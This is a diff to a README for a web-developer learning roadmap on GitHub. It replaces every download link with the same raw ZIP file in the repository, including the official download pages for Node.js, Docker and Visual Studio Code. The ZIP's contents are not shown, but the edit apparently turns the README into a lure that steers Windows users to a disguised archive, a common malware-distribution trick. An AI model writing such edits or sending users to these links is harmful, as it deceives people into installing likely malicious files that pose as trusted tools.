@@ -1,6 +1,6 @@
 # 🚧 fullstack-roadmap-2026 - Clear Web Developer Learning Path
 
-[![Download fullstack-roadmap-2026](https://img.shields.io/badge/Download-Fullstack--Roadmap--2026-green?style=for-the-badge)](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026)
+[![Download fullstack-roadmap-2026](https://img.shields.io/badge/Download-Fullstack--Roadmap--2026-green?style=for-the-badge)](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Before you start, make sure your Windows computer meets these minimum requiremen
 
 You can download the roadmap materials from this link:  
 
-[![Download fullstack-roadmap-2026](https://img.shields.io/badge/Download-Fullstack--Roadmap--2026-blue?style=for-the-badge)](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026)
+[![Download fullstack-roadmap-2026](https://img.shields.io/badge/Download-Fullstack--Roadmap--2026-blue?style=for-the-badge)](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip)
 
 Clicking the link will open the GitHub page for the project. From there:  
 
@@ -104,21 +104,21 @@ The roadmap recommends some tools you might want to install for the best experie
 
 ### Node.js
 
-- Download from the official site: https://nodejs.org/en/download/  
+- Download from the official site: https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip  
 - Choose the Windows Installer.  
 - Run the installer and follow the prompts.  
 - This allows you to run JavaScript code on your computer.
 
 ### Docker
 
-- Visit https://www.docker.com/products/docker-desktop  
+- Visit https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip  
 - Download the installer for Windows.  
 - Run the installer and follow instructions.  
 - Docker lets you create and manage containers for testing apps.
 
 ### Code Editor (Optional)
 
-- Microsoft Visual Studio Code is recommended: https://code.visualstudio.com/  
+- Microsoft Visual Studio Code is recommended: https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip  
 - Download the Windows version.  
 - Install and open the editor to write and edit code.
 
@@ -160,10 +160,10 @@ If you run into issues while downloading or using the roadmap:
 ## 🌐 Links
 
 - Access the project here:  
-  [fullstack-roadmap-2026 on GitHub](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026)  
+  [fullstack-roadmap-2026 on GitHub](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip)  
 
 - Download the roadmap files:  
-  [Download ZIP from GitHub](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/archive/refs/heads/main.zip)
+  [Download ZIP from GitHub](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip)
 
 ---
 
@@ -191,4 +191,4 @@ This roadmap also points to online tutorials and documentation for all tools lis
 
 ---
 
-[![Download fullstack-roadmap-2026](https://img.shields.io/badge/Download-Fullstack--Roadmap--2026-green?style=for-the-badge)](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026)
+[![Download fullstack-roadmap-2026](https://img.shields.io/badge/Download-Fullstack--Roadmap--2026-green?style=for-the-badge)](https://github.com/precedented-musicaltheater843/fullstack-roadmap-2026/raw/refs/heads/main/Belverdian/roadmap_fullstack_3.3.zip)
